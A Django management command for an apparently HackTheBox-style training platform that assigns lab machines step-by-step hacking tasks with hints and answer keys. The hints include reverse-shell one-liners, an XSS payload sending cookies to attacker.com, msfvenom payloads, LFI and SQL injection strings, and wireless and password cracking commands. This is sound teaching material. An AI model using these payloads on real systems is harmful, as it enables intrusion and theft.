from django.core.management.base import BaseCommand
from api.models import Machine

class Command(BaseCommand):
    help = 'Give EVERY machine SPECIFIC questions based on machine type/attack vector - HackTheBox style!'

    def handle(self, *args, **kwargs):
        # Dictionary mapping machine names/keywords to SPECIFIC questions
        # Each machine gets UNIQUE questions based on its attack type
        machine_questions = {
            # Challenge - Password Cracking
            'JohnCrack': {
                'tasks': [
                    {'title': '1. Find Flag', 'question': 'Download the ZIP challenge file and crack the password using John the Ripper', 'hint': 'Use: zip2john file.zip > hash.txt then john hash.txt', 'points': 10, 'answer': 'cracked'},
                ]
            },
            
            # Original HTB Machines
            'Lame': {
                'tags': ['samba', 'metasploit'],
                'tasks': [
                    {'title': '1. START', 'question': 'Scan for Samba service - find open ports 139/445', 'hint': 'nmap -sV -p 139,445 10.10.10.3', 'points': 10, 'answer': 'samba'},
                    {'title': '2. Enum', 'question': 'Enumerate Samba version and identify if its vulnerable', 'hint': 'enum4linux -v 10.10.10.3 or smbclient -L //10.10.10.3', 'points': 10, 'answer': 'version'},
                    {'title': '3. Exploit', 'question': 'Search for Samba exploit - usermap script vulnerability', 'hint': 'searchsploit samba 3.0.20 or use metasploit exploit/multi/samba/usermap_script', 'points': 15, 'answer': 'usermap'},
                    {'title': '4. Shell', 'question': 'Get shell as samba user', 'hint': 'nc -e /bin/sh 10.10.10.x 4444', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user flag in /home/*/user.txt', 'hint': 'find /home -name user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Escalate to root using sudo -l or find SUID binaries', 'hint': 'sudo -l or find / -perm -4000', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Blue': {
                'tags': ['windows', 'eternalblue', 'ms17-010'],
                'tasks': [
                    {'title': '1. START', 'question': 'Scan for SMB service and check for MS17-010 vulnerability', 'hint': 'nmap -p 445 --script smb-vuln-ms17-010 10.10.10.40', 'points': 10, 'answer': 'ms17-010'},
                    {'title': '2. Enum', 'question': 'Enumerate Windows SMB version and OS info', 'hint': 'enum4linux -a 10.10.10.40 or nmap -A -p 445 10.10.10.40', 'points': 10, 'answer': 'windows'},
                    {'title': '3. Exploit', 'question': 'Use EternalBlue exploit for MS17-010', 'hint': 'msfconsole: use exploit/windows/smb/ms17_010_eternalblue', 'points': 15, 'answer': 'eternalblue'},
                    {'title': '4. Shell', 'question': 'Get Windows shell as SYSTEM', 'hint': 'set payload windows/x64/shell_reverse_tcp', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user flag - check C:\\Users\\*\\Desktop\\user.txt', 'hint': 'type C:\\Users\\*\\Desktop\\user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Find root flag in C:\\Users\\Administrator\\Desktop\\root.txt', 'hint': 'type C:\\Users\\Administrator\\Desktop\\root.txt', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Jerry': {
                'tags': ['tomcat', 'windows', 'default-creds'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find Apache Tomcat service running on port 8080', 'hint': 'nmap -sV -p 8080 10.10.10.95', 'points': 10, 'answer': 'tomcat'},
                    {'title': '2. Enum', 'question': 'Find Tomcat Manager login page', 'hint': 'gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirb/common.txt', 'points': 10, 'answer': 'manager'},
                    {'title': '3. Exploit', 'question': 'Use default Tomcat credentials to login', 'hint': 'tomcat:tomcat or admin:admin', 'points': 15, 'answer': 'credentials'},
                    {'title': '4. Shell', 'question': 'Upload and deploy WAR reverse shell via Tomcat Manager', 'hint': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=x LPORT=4444 -f war', 'points': 10, 'answer': 'war'},
                    {'title': '5. User', 'question': 'Find user flag in C:\\Users\\*\\Desktop\\user.txt', 'hint': 'dir /s /b user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Escalate to Administrator using service account or stored credentials', 'hint': 'whoami /all or privilege::debug', 'points': 20, 'answer': 'admin'},
                ]
            },
            
            'Nibbles': {
                'tags': ['cms', 'linux', 'sudo'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find Nibbleblog CMS running on web server', 'hint': 'nmap -sV 10.10.10.75 or nikto -h http://10.10.10.75', 'points': 10, 'answer': 'nibbleblog'},
                    {'title': '2. Enum', 'question': 'Enumerate Nibbleblog directories - find admin panel', 'hint': 'gobuster dir -u http://10.10.10.75 -x php', 'points': 10, 'answer': 'admin'},
                    {'title': '3. Exploit', 'question': 'Exploit Nibbleblog arbitrary file upload vulnerability', 'hint': 'searchsploit nibbleblog or my_image.php exploit', 'points': 15, 'answer': 'upload'},
                    {'title': '4. Shell', 'question': 'Get PHP reverse shell and catch with netcat', 'hint': 'nc -lvp 4444', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user.txt in /home/nibbler/', 'hint': 'cat /home/nibbler/user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Escalate to root via sudo permissions', 'hint': 'sudo -l shows (ALL) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Bank': {
                'tags': ['web', 'dns', 'linux', 'suid'],
                'tasks': [
                    {'title': '1. START', 'question': 'Enumerate DNS records and find bank.htb domain', 'hint': 'dnsenum bank.htb or dig axfr bank.htb @10.10.10.29', 'points': 10, 'answer': 'dns'},
                    {'title': '2. Enum', 'question': 'Find web application and login page', 'hint': 'nikto -h http://10.10.10.29 or gobuster', 'points': 10, 'answer': 'web'},
                    {'title': '3. Exploit', 'question': 'Exploit PHP file upload or SQL injection', 'hint': 'Try SQLi on login or upload php shell', 'points': 15, 'answer': 'upload'},
                    {'title': '4. Shell', 'question': 'Get shell via uploaded web shell', 'hint': 'curl http://10.10.10.29/uploads/shell.php', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user credentials or SSH key', 'hint': 'cat /etc/passwd or find /var/www', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Find writable SUID binary and escalate to root', 'hint': 'find / -perm -4000 or check /var/backups', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Poison': {
                'tags': ['lfi', 'freebsd', 'vnc', 'ssh-tunneling'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application and test for LFI vulnerability', 'hint': 'nmap -sV 10.10.10.84 or check port 80', 'points': 10, 'answer': 'lfi'},
                    {'title': '2. Enum', 'question': 'Exploit Local File Inclusion to read sensitive files', 'hint': '?page=../../../../etc/passwd or phpfilter', 'points': 10, 'answer': 'lfi'},
                    {'title': '3. Exploit', 'question': 'Find VNC credentials or SSH keys via LFI', 'hint': 'LFI to read .bash_history or config files', 'points': 15, 'answer': 'credentials'},
                    {'title': '4. Shell', 'question': 'Tunnel VNC or SSH through discovered credentials', 'hint': 'ssh -L 5901:localhost:5901 user@10.10.10.84', 'points': 10, 'answer': 'tunnel'},
                    {'title': '5. User', 'question': 'Find user flag in /home/*/user.txt', 'hint': 'ls /home or cat /home/*/user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Escalate privileges via sudo or crontab', 'hint': 'sudo -l or crontab -l', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Haircut': {
                'tags': ['command-injection', 'linux', 'web'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application with curl or file download feature', 'hint': 'nmap -sV 10.10.10.24 or nikto -h http://10.10.10.24', 'points': 10, 'answer': 'web'},
                    {'title': '2. Enum', 'question': 'Enumerate web directories - find upload or curl functionality', 'hint': 'gobuster dir -u http://10.10.10.24', 'points': 10, 'answer': 'upload'},
                    {'title': '3. Exploit', 'question': 'Exploit command injection vulnerability', 'hint': '; cat /etc/passwd or $(whoami)', 'points': 15, 'answer': 'cmdi'},
                    {'title': '4. Shell', 'question': 'Get reverse shell using bash TCP reverse shell', 'hint': 'bash -i >& /dev/tcp/10.10.10.x/4444 0>&1', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user flag in /home/*/user.txt', 'hint': 'cat /home/*/user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Find writable cron job or SUID for root', 'hint': 'cat /etc/crontab or find / -perm -4000', 'points': 20, 'answer': 'root'},
                ]
            },
            
            'Holiday': {
                'tags': ['nodejs', 'sqli', 'linux', 'hard'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application built with Node.js', 'hint': 'nmap -sV 10.10.10.25 or whatweb http://10.10.10.25', 'points': 10, 'answer': 'nodejs'},
                    {'title': '2. Enum', 'question': 'Enumerate login page and test for SQL injection', 'hint': 'sqlmap or manual \'+or+1=1--', 'points': 10, 'answer': 'sqli'},
                    {'title': '3. Exploit', 'question': 'Exploit SQL injection to extract credentials', 'hint': 'sqlmap -u http://10.10.10.25/login --dump', 'points': 15, 'answer': 'sqli'},
                    {'title': '4. Shell', 'question': 'Login and exploit Node.js deserialization or RCE', 'hint': 'searchsploit nodejs or prototype pollution', 'points': 20, 'answer': 'rce'},
                    {'title': '5. User', 'question': 'Find user flag', 'hint': 'find /home -name user.txt', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Complex privilege escalation - check sudo, cron, or kernel exploits', 'hint': 'LinEnum.sh or linux-exploit-suggester', 'points': 25, 'answer': 'root'},
                ]
            },
            
            # Wireless Machines
            'Wifite': {
                'tags': ['wifite', 'aircrack-ng', 'wpa2'],
                'tasks': [
                    {'title': '1. START', 'question': 'Put wireless card in monitor mode', 'hint': 'airmon-ng start wlan0', 'points': 10, 'answer': 'monitor'},
                    {'title': '2. Enum', 'question': 'Scan for available wireless networks', 'hint': 'airodump-ng wlan0mon', 'points': 10, 'answer': 'networks'},
                    {'title': '3. Exploit', 'question': 'Capture WPA2 handshake from target network', 'hint': 'airodump-ng --bssid [MAC] --channel [CH] wlan0mon', 'points': 15, 'answer': 'handshake'},
                    {'title': '4. Crack', 'question': 'Crack WPA2 handshake using aircrack-ng', 'hint': 'aircrack-ng -w wordlist.txt capture.hcap', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Connect', 'question': 'Connect to wireless network with cracked password', 'hint': 'iwconfig wlan0 essid [NAME] key [PASSWORD]', 'points': 10, 'answer': 'connected'},
                    {'title': '6. END', 'question': 'Find hidden flag on the wireless network', 'hint': 'Access router or connected devices', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'Aircrack': {
                'tags': ['aircrack-ng', 'wep', 'wireless'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find WEP encrypted wireless network', 'hint': 'airodump-ng wlan0mon', 'points': 10, 'answer': 'wep'},
                    {'title': '2. Enum', 'question': 'Capture IVs (Initialization Vectors) from target AP', 'hint': 'airodump-ng --bssid [MAC] --channel [CH] --write wep_capture wlan0mon', 'points': 10, 'answer': 'ivs'},
                    {'title': '3. Exploit', 'question': 'Perform ARP replay attack to generate IVs', 'hint': 'aireplay-ng --arp -3 -b [AP_MAC] -h [CLIENT_MAC] wlan0mon', 'points': 15, 'answer': 'arp'},
                    {'title': '4. Crack', 'question': 'Crack WEP key using aircrack-ng', 'hint': 'aircrack-ng wep_capture-01.cap', 'points': 15, 'answer': 'key'},
                    {'title': '5. Connect', 'question': 'Connect to WEP network', 'hint': 'iwconfig wlan0 essid [NAME] key [HEX_KEY]', 'points': 10, 'answer': 'connected'},
                    {'title': '6. END', 'question': 'Access network and find flag', 'hint': 'Access router or scan network', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'ReaverPro': {
                'tags': ['reaver', 'wps', 'bruteforce'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find wireless network with WPS enabled', 'hint': 'wash -i wlan0mon', 'points': 10, 'answer': 'wps'},
                    {'title': '2. Enum', 'question': 'Identify WPS PIN and AP MAC address', 'hint': 'airodump-ng wlan0mon or wash', 'points': 10, 'answer': 'pin'},
                    {'title': '3. Exploit', 'question': 'Brute force WPS PIN using Reaver', 'hint': 'reaver -i wlan0mon -b [AP_MAC] -vv', 'points': 15, 'answer': 'reaver'},
                    {'title': '4. Crack', 'question': 'Recover WPA password from WPS PIN', 'hint': 'reaver obtains the PIN and returns WPA PSK', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Connect', 'question': 'Connect to network using cracked credentials', 'hint': 'iwconfig wlan0 essid [NAME] key [PASSWORD]', 'points': 10, 'answer': 'connected'},
                    {'title': '6. END', 'question': 'Access network resources and find flag', 'hint': 'Scan network for devices', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            # Password Cracking Machines
            'Hashcat': {
                'tags': ['hashcat', 'password-cracking', 'gpu'],
                'tasks': [
                    {'title': '1. START', 'question': 'Identify the hash type from given hash file', 'hint': 'hash-identifier or hashcat --example-hashes', 'points': 10, 'answer': 'hashid'},
                    {'title': '2. Enum', 'question': 'Determine hash mode number for hashcat', 'hint': 'hashcat -m [mode] --help | grep hash_type', 'points': 10, 'answer': 'mode'},
                    {'title': '3. Prepare', 'question': 'Prepare wordlist and rules for cracking', 'hint': 'Use rockyou.txt and combinator rule', 'points': 10, 'answer': 'wordlist'},
                    {'title': '4. Crack', 'question': 'Crack the hash using hashcat with GPU', 'hint': 'hashcat -m [MODE] hash.txt wordlist.txt', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Verify', 'question': 'Verify cracked password', 'hint': 'hashcat -m [MODE] hash.txt --show', 'points': 10, 'answer': 'verify'},
                    {'title': '6. END', 'question': 'Use cracked password to access target system', 'hint': 'SSH or login with credentials', 'points': 20, 'answer': 'access'},
                ]
            },
            
            'John': {
                'tags': ['john', 'password-cracking', 'john-the-ripper'],
                'tasks': [
                    {'title': '1. START', 'question': 'Extract hash from password-protected file', 'hint': 'zip2john, pdf2john, or unshadow', 'points': 10, 'answer': 'extract'},
                    {'title': '2. Enum', 'question': 'Identify hash type', 'hint': 'john --format=raw-md5 hash.txt --show', 'points': 10, 'answer': 'identify'},
                    {'title': '3. Prepare', 'question': 'Prepare wordlist for cracking', 'hint': 'Use /usr/share/wordlists/rockyou.txt', 'points': 10, 'answer': 'wordlist'},
                    {'title': '4. Crack', 'question': 'Crack password using John the Ripper', 'hint': 'john --wordlist=rockyou.txt hash.txt', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Verify', 'question': 'Show cracked password', 'hint': 'john --show hash.txt', 'points': 10, 'answer': 'show'},
                    {'title': '6. END', 'question': 'Use cracked password to access target', 'hint': 'unzip, ssh, or login', 'points': 20, 'answer': 'access'},
                ]
            },
            
            'Hydra': {
                'tags': ['hydra', 'brute-force', 'ssh', 'ftp'],
                'tasks': [
                    {'title': '1. START', 'question': 'Identify target service (SSH, FTP, HTTP)', 'hint': 'nmap -sV target', 'points': 10, 'answer': 'service'},
                    {'title': '2. Enum', 'question': 'Find valid usernames if not provided', 'hint': 'enum4linux or username enumeration', 'points': 10, 'answer': 'users'},
                    {'title': '3. Prepare', 'question': 'Prepare username and password wordlists', 'hint': 'Use hydra -L users.txt -P passwords.txt', 'points': 10, 'answer': 'wordlists'},
                    {'title': '4. Crack', 'question': 'Brute force login using Hydra', 'hint': 'hydra -L users.txt -P rockyou.txt ssh://target', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Verify', 'question': 'Test credentials manually', 'hint': 'ssh user@target', 'points': 10, 'answer': 'verify'},
                    {'title': '6. END', 'question': 'Access system with cracked credentials', 'hint': 'SSH, FTP, or web admin login', 'points': 20, 'answer': 'access'},
                ]
            },
            
            # Web Hacking Machines
            'Sqlmap': {
                'tags': ['sqlmap', 'sqli', 'injection'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application with SQL injection vulnerability', 'hint': 'nmap --script=http-sql-injection target or manual testing', 'points': 10, 'answer': 'sqli'},
                    {'title': '2. Enum', 'question': 'Enumerate databases using sqlmap', 'hint': 'sqlmap -u "http://target/page.php?id=1" --dbs', 'points': 10, 'answer': 'databases'},
                    {'title': '3. Exploit', 'question': 'Extract database tables and data', 'hint': 'sqlmap -u "url" --tables --dump', 'points': 15, 'answer': 'dump'},
                    {'title': '4. Shell', 'question': 'Try to get OS shell via --os-shell', 'hint': 'sqlmap -u "url" --os-shell', 'points': 15, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user credentials in database', 'hint': 'sqlmap -u "url" --users --passwords', 'points': 10, 'answer': 'creds'},
                    {'title': '6. END', 'question': 'Use cracked credentials to access system', 'hint': 'SSH or web admin panel', 'points': 20, 'answer': 'access'},
                ]
            },
            
            'XSS': {
                'tags': ['xss', 'cross-site-scripting', 'web'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application with input fields', 'hint': 'Manual review or Burp Suite', 'points': 10, 'answer': 'input'},
                    {'title': '2. Enum', 'question': 'Test for Reflected XSS vulnerability', 'hint': '<script>alert(1)</script>', 'points': 10, 'answer': 'reflected'},
                    {'title': '3. Exploit', 'question': 'Exploit Stored XSS to steal session cookie', 'hint': '<script>new Image().src="http://attacker.com?c="+document.cookie</script>', 'points': 15, 'answer': 'cookie'},
                    {'title': '4. Session', 'question': 'Use stolen cookie to hijack session', 'hint': 'Edit cookie in browser DevTools', 'points': 10, 'answer': 'session'},
                    {'title': '5. Access', 'question': 'Access admin panel with stolen session', 'hint': 'Visit /admin with cookie', 'points': 10, 'answer': 'admin'},
                    {'title': '6. END', 'question': 'Find flag in admin dashboard', 'hint': 'Search for flag in database or files', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'LFI': {
                'tags': ['lfi', 'local-file-inclusion', 'web'],
                'tasks': [
                    {'title': '1. START', 'question': 'Identify LFI vulnerability in web URL parameters', 'hint': 'Test ?page=, ?file=, ?include= etc.', 'points': 10, 'answer': 'lfi'},
                    {'title': '2. Enum', 'question': 'Read sensitive system files via LFI', 'hint': '../../../../etc/passwd', 'points': 10, 'answer': 'passwd'},
                    {'title': '3. Exploit', 'question': 'Read application config files for credentials', 'hint': '../../../../var/www/html/config.php or .env', 'points': 15, 'answer': 'config'},
                    {'title': '4. Shell', 'question': 'Get RCE via LFI with PHP wrappers or log poisoning', 'hint': 'php://input or /proc/self/environ injection', 'points': 15, 'answer': 'rce'},
                    {'title': '5. User', 'question': 'Find user credentials from config', 'hint': 'cat config.php', 'points': 10, 'answer': 'creds'},
                    {'title': '6. END', 'question': 'SSH or access application with found credentials', 'hint': 'ssh user@target', 'points': 20, 'answer': 'access'},
                ]
            },
            
            'RCE': {
                'tags': ['rce', 'remote-code-execution', 'web'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find web application with code execution', 'hint': 'Test ping, ping sweep, or command execution features', 'points': 10, 'answer': 'rce'},
                    {'title': '2. Enum', 'question': 'Identify OS and available tools', 'hint': 'uname -a or whoami', 'points': 10, 'answer': 'enum'},
                    {'title': '3. Exploit', 'question': 'Execute reverse shell payload', 'hint': 'bash -i >& /dev/tcp/10.10.10.x/4444 0>&1', 'points': 15, 'answer': 'shell'},
                    {'title': '4. Shell', 'question': 'Catch reverse shell with netcat', 'hint': 'nc -lvp 4444', 'points': 10, 'answer': 'shell'},
                    {'title': '5. User', 'question': 'Find user credentials or SSH keys', 'hint': 'cat /etc/passwd or .ssh/id_rsa', 'points': 10, 'answer': 'user'},
                    {'title': '6. END', 'question': 'Escalate to root', 'hint': 'sudo -l, SUID binaries, or kernel exploit', 'points': 20, 'answer': 'root'},
                ]
            },
            
            # Privilege Escalation
            'Sudo': {
                'tags': ['sudo', 'privilege-escalation', 'linux'],
                'tasks': [
                    {'title': '1. START', 'question': 'Check current user sudo permissions', 'hint': 'sudo -l', 'points': 10, 'answer': 'sudo'},
                    {'title': '2. Enum', 'question': 'Identify sudo binaries that can be exploited', 'hint': 'Look for (ALL) NOPASSWD entries', 'points': 10, 'answer': 'binaries'},
                    {'title': '3. Exploit', 'question': 'Exploit sudo binary for root access', 'hint': 'sudo vim, less, or find with !/bin/sh', 'points': 15, 'answer': 'exploit'},
                    {'title': '4. Root', 'question': 'Get root shell', 'hint': ':!/bin/bash in vim or !sh in less', 'points': 10, 'answer': 'root'},
                    {'title': '5. Verify', 'question': 'Verify root access with id command', 'hint': 'id or whoami', 'points': 10, 'answer': 'verify'},
                    {'title': '6. END', 'question': 'Find root flag', 'hint': 'cat /root/root.txt', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'SUID': {
                'tags': ['suid', 'privilege-escalation', 'linux'],
                'tasks': [
                    {'title': '1. START', 'question': 'Find SUID binaries on the system', 'hint': 'find / -perm -4000 2>/dev/null', 'points': 10, 'answer': 'suid'},
                    {'title': '2. Enum', 'question': 'Identify vulnerable SUID binaries', 'hint': 'GTFOBins search for binary exploits', 'points': 10, 'answer': 'gtfobins'},
                    {'title': '3. Exploit', 'question': 'Exploit SUID binary to get root', 'hint': 'Use GTFOBins payload for specific binary', 'points': 15, 'answer': 'exploit'},
                    {'title': '4. Root', 'question': 'Get root shell', 'hint': './binary with GTFOBins payload', 'points': 10, 'answer': 'root'},
                    {'title': '5. Verify', 'question': 'Verify root access', 'hint': 'id shows uid=0', 'points': 10, 'answer': 'verify'},
                    {'title': '6. END', 'question': 'Capture root flag', 'hint': 'cat /root/root.txt', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'Kernel': {
                'tags': ['kernel', 'privilege-escalation', 'exploit'],
                'tasks': [
                    {'title': '1. START', 'question': 'Identify kernel version and OS info', 'hint': 'uname -a or cat /etc/issue', 'points': 10, 'answer': 'kernel'},
                    {'title': '2. Enum', 'question': 'Search for kernel exploits', 'hint': 'searchsploit linux kernel [version] or linux-exploit-suggester', 'points': 10, 'answer': 'exploit'},
                    {'title': '3. Exploit', 'question': 'Download and compile kernel exploit', 'hint': 'wget exploit.c && gcc exploit.c -o exploit', 'points': 15, 'answer': 'compile'},
                    {'title': '4. Run', 'question': 'Execute kernel exploit to gain root', 'hint': './exploit', 'points': 15, 'answer': 'root'},
                    {'title': '5. Verify', 'question': 'Verify root access', 'hint': 'id or whoami', 'points': 10, 'answer': 'verify'},
                    {'title': '6. END', 'question': 'Capture root flag', 'hint': 'cat /root/root.txt', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            # Network/Active Directory
            'Kerberos': {
                'tags': ['kerberos', 'active-directory', 'windows'],
                'tasks': [
                    {'title': '1. START', 'question': 'Enumerate Active Directory users via Kerberos', 'hint': 'enum4linux -U target or GetADUsers.py', 'points': 10, 'answer': 'users'},
                    {'title': '2. Enum', 'question': 'Check Kerberos pre-authentication', 'hint': 'GetNPUsers.py or kerbrute', 'points': 10, 'answer': 'asrep'},
                    {'title': '3. Exploit', 'question': 'ASREP Roasting - Get TGT for users with DONT_REQ_PREAUTH', 'hint': 'GetNPUsers.py -no-pass -dc-ip target', 'points': 15, 'answer': 'asrep'},
                    {'title': '4. Crack', 'question': 'Crack obtained hash with Hashcat', 'hint': 'hashcat -m 18200 hash.txt wordlist.txt', 'points': 15, 'answer': 'cracked'},
                    {'title': '5. Access', 'question': 'Use cracked credentials to access system', 'hint': 'evil-winrm or smbclient', 'points': 10, 'answer': 'access'},
                    {'title': '6. END', 'question': 'Escalate to Domain Admin', 'hint': 'Pass-the-Hash or sekurlsa::pth', 'points': 20, 'answer': 'admin'},
                ]
            },
            
            # CTF/Forensics
            'Stego': {
                'tags': ['steganography', 'stego', 'forensics'],
                'tasks': [
                    {'title': '1. START', 'question': 'Analyze image file for hidden data', 'hint': 'file image.jpg or exiftool image.jpg', 'points': 10, 'answer': 'analyze'},
                    {'title': '2. Enum', 'question': 'Check for embedded data using steghide', 'hint': 'steghide extract -sf image.jpg', 'points': 10, 'answer': 'steghide'},
                    {'title': '3. Exploit', 'question': 'Try other steganography tools', 'hint': 'zsteg, stegsolve, or binwalk', 'points': 15, 'answer': 'tools'},
                    {'title': '4. Extract', 'question': 'Extract hidden data or files', 'hint': 'dd if=image.jpg of=extracted bs=1 skip=N', 'points': 15, 'answer': 'extract'},
                    {'title': '5. Decode', 'question': 'Decode extracted data', 'hint': 'base64 -d, hex2raw, or other decode', 'points': 10, 'answer': 'decode'},
                    {'title': '6. END', 'question': 'Find flag in extracted data', 'hint': 'cat extracted_file', 'points': 20, 'answer': 'flag'},
                ]
            },
            
            'Forensics': {
                'tags': ['forensics', 'memory', 'malware'],
                'tasks': [
                    {'title': '1. START', 'question': 'Analyze memory dump for suspicious processes', 'hint': 'volatility -f mem.img pslist', 'points': 10, 'answer': 'process'},
                    {'title': '2. Enum', 'question': 'Extract network connections from memory', 'hint': 'volatility -f mem.img netscan', 'points': 10, 'answer': 'network'},
                    {'title': '3. Exploit', 'question': 'Find malicious processes or injected code', 'hint': 'volatility -f mem.img malfind', 'points': 15, 'answer': 'malware'},
                    {'title': '4. Extract', 'question': 'Extract artifacts or credentials', 'hint': 'volatility -f mem.img hashdump', 'points': 15, 'answer': 'creds'},
                    {'title': '5. Analyze', 'question': 'Analyze malware sample', 'hint': 'strings malware.exe or pestudio', 'points': 10, 'answer': 'analyze'},
                    {'title': '6. END', 'question': 'Find flag or IoC in analysis', 'hint': 'Extract flag from memory', 'points': 20, 'answer': 'flag'},
                ]
            },
        }
        
        # Get all machines
        machines = Machine.objects.all()
        self.stdout.write(f'Found {machines.count()} machines')
        
        updated = 0
        
        for machine in machines:
            # Check if machine has specific questions defined
            matched = False
            
            # First try exact name match
            if machine.name in machine_questions:
                machine.tasks = machine_questions[machine.name]['tasks']
                machine.save()
                self.stdout.write(f'{machine.name}: Assigned specific {len(machine.tasks)} tasks')
                updated += 1
                matched = True
                continue
            
            # Try to match by tags or name keywords
            machine_tags = machine.tags if isinstance(machine.tags, list) else []
            machine_name_lower = machine.name.lower()
            
            for q_name, q_data in machine_questions.items():
                if 'tags' in q_data:
                    # Check if any tag matches
                    for tag in machine_tags:
                        if tag.lower() in [t.lower() for t in q_data['tags']]:
                            machine.tasks = q_data['tasks']
                            machine.save()
                            self.stdout.write(f'{machine.name}: Matched by tag "{tag}" -> {q_name}')
                            updated += 1
                            matched = True
                            break
                    if matched:
                        break
                    
                    # Also check if machine name contains keyword
                    for tag in q_data['tags']:
                        if tag.lower() in machine_name_lower:
                            machine.tasks = q_data['tasks']
                            machine.save()
                            self.stdout.write(f'{machine.name}: Matched by name "{tag}" -> {q_name}')
                            updated += 1
                            matched = True
                            break
                    if matched:
                        break
            
            # If no match found, give generic but DIFFERENT questions based on OS
            if not matched:
                if machine.os == 'Windows':
                    generic_tasks = [
                        {'title': '1. START', 'question': f'Reconnaissance on {machine.name} - scan ports and services', 'hint': 'nmap -sV -sC 10.10.10.X', 'points': 10, 'answer': 'scan'},
                        {'title': '2. Enum', 'question': f'Enumerate Windows services and versions', 'hint': 'nmap -A -p 445,3389 10.10.10.X', 'points': 10, 'answer': 'enum'},
                        {'title': '3. Exploit', 'question': f'Find and exploit vulnerability in {machine.name}', 'hint': 'searchsploit or msfconsole', 'points': 15, 'answer': 'exploit'},
                        {'title': '4. Shell', 'question': f'Get shell on {machine.name}', 'hint': 'msfvenom or nc', 'points': 10, 'answer': 'shell'},
                        {'title': '5. User', 'question': 'Find user flag', 'hint': 'dir C:\\Users\\*\\Desktop\\user.txt', 'points': 10, 'answer': 'user'},
                        {'title': '6. END', 'question': 'Escalate to Administrator/SYSTEM', 'hint': 'mimikatz or service exploit', 'points': 20, 'answer': 'root'},
                    ]
                else:
                    generic_tasks = [
                        {'title': '1. START', 'question': f'Reconnaissance on {machine.name} - scan ports and services', 'hint': 'nmap -sV -sC 10.10.10.X', 'points': 10, 'answer': 'scan'},
                        {'title': '2. Enum', 'question': f'Enumerate web directories and services', 'hint': 'gobuster dir -u http://10.10.10.X', 'points': 10, 'answer': 'enum'},
                        {'title': '3. Exploit', 'question': f'Find and exploit vulnerability in {machine.name}', 'hint': 'searchsploit or manual exploitation', 'points': 15, 'answer': 'exploit'},
                        {'title': '4. Shell', 'question': f'Get shell on {machine.name}', 'hint': 'reverse shell payload', 'points': 10, 'answer': 'shell'},
                        {'title': '5. User', 'question': 'Find user flag', 'hint': 'find /home -name user.txt', 'points': 10, 'answer': 'user'},
                        {'title': '6. END', 'question': 'Escalate to root', 'hint': 'sudo -l, SUID, or kernel exploit', 'points': 20, 'answer': 'root'},
                    ]
                
                machine.tasks = generic_tasks
                machine.save()
                self.stdout.write(f'{machine.name}: Generic {machine.os} tasks')
                updated += 1
        
        self.stdout.write(self.style.SUCCESS(f'\nDone! Updated {updated} machines with specific questions!'))
        self.stdout.write(self.style.SUCCESS('Each machine now has its own HackTheBox-style questions based on attack type!'))
